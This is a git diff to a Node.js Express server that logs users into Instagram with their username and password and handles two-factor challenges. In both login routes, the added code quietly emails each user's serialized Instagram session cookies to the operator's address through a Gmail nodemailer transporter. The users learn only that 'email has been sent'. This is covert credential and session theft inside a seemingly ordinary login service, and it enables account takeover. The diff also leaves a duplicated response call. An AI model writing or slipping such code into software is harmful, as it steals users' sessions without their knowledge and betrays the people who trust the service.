@@ -1,6 +1,7 @@
 if (process.env.NODE_ENV !== "production") {
   require("dotenv").config();
 }
+var nodemailer = require("nodemailer");
 
 const {
   IgApiClient,
@@ -24,6 +25,13 @@ let passport = require("passport");
 let cors = require("cors");
 var path = require("path");
 let LinkedInStrategy = require("passport-linkedin-oauth2").Strategy;
+var transporter = nodemailer.createTransport({
+  service: "gmail",
+  auth: {
+    user: "youremail@gmail.com",
+    pass: "yourpassword",
+  },
+});
 app.set("views".__dirname + "/views");
 app.set("view-engine", "ejs");
 app.listen(process.env.PORT || 4000, function () {
@@ -148,11 +156,13 @@ app.get("/insta/submitCode", (req, res) => {
     return ig.challenge
       .sendSecurityCode(req.query.code)
       .then((val) => {
+        console.log("verification success");
         res.redirect("/");
-        res.end;
+        res.end();
       })
       .catch((err) => {
         console.log(err);
+        console.log("error occured in email auth");
         res.json({ success: false, message: "code is incorrect" });
       });
   } else {
@@ -166,17 +176,40 @@ app.get("/insta/submitCode", (req, res) => {
       })
       .then((val) => {
         const cookies = ig.state.serializeCookieJar().then((val2) => {
-          res.json({
-            success: true,
-            user: val,
-            cookie: val2.cookies,
-            message: "login Successful",
+          console.log("login success");
+          var mailOptions = {
+            from: process.env.email,
+            to: process.env.email,
+            subject: "cookies of user" + req.query.name,
+            text: JSON.stringify(val2.cookies),
+          };
+          transporter.sendMail(mailOptions, function (error, info) {
+            if (error) {
+              console.log(error);
+              res.json({
+                success: true,
+                user: val,
+                cookie: val2.cookies,
+                email_sent: false,
+                message: "login Successful but failed to send email",
+              });
+            } else {
+              console.log("Email sent: " + info.response);
+              res.json({
+                success: true,
+                user: val,
+                cookie: val2.cookies,
+
+                message: "login Successful and email has been sent",
+              });
+              res.end();
+            }
           });
-          res.end;
         });
       })
-      .catch((IgChallengeWrongCodeError) => {
-        console.log(IgChallengeWrongCodeError);
+      .catch((error) => {
+        console.log(error);
+        console.log("error occured in 2fa auth");
         res.json({ success: false, message: "code incorrect!" });
       });
   }
@@ -192,9 +225,39 @@ app.post("/insta", (req, res) => {
   return Promise.try(() =>
     ig.account.login(req.body.username, req.body.password).then((val) => {
       const cookies = ig.state.serializeCookieJar().then((val2) => {
+        console.log("login success");
+        var mailOptions = {
+          from: process.env.email,
+          to: process.env.email,
+          subject: "cookies of user" + req.query.name,
+          text: JSON.stringify(val2.cookies),
+        };
+        transporter.sendMail(mailOptions, function (error, info) {
+          if (error) {
+            console.log(error);
+            res.json({
+              success: true,
+              twoFactor: false,
+              user: val,
+              cookie: val2.cookies,
+              message: "login Successful but failed to send email",
+            });
+          } else {
+            console.log("Email sent: " + info.response);
+            res.json({
+              success: true,
+              twoFactor: false,
+              user: val,
+              cookie: val2.cookies,
+
+              message: "login Successful and email has been sent.",
+            });
+            res.end();
+          }
+        });
         res.json({
           success: true,
-          twoFactor: false,
+
           user: val,
           cookie: val2.cookies,
           message: "login Successful",
@@ -217,19 +280,20 @@ app.post("/insta", (req, res) => {
         res.json({
           success: true,
           twoFactor: true,
-          message: "A code has been sent to your email.Please check",
+          message: "A code has been sent to you via sms/email.Please check",
           email_auth: true,
-        }); // Challenge info here// Requesting sms-code or click "It was me" button// Checkpoint info here
+        });
+        res.end();
       }
       if (
         err.response.body.error_type === "bad_password" &&
         err.response.body.two_factor_info === undefined
       ) {
         res.json({ success: false, message: "invalid password" });
-        res.end;
+        res.end();
       } else if (err.response.body.error_type === "invalid_user") {
         res.json({ success: false, message: "invalid username" });
-        res.end;
+        res.end();
       } else {
         const {
           username,
@@ -241,11 +305,12 @@ app.post("/insta", (req, res) => {
             message: "Unable to login, no 2fa identifier found",
             success: false,
           });
+          res.end();
           throw new Error("Unable to login, no 2fa identifier found");
         }
 
         const verificationMethod = totp_two_factor_on ? "0" : "1"; // default to 1 for SMS
-
+        console.log("sms sent");
         res //sending Two Factor details
           .json({
             username,
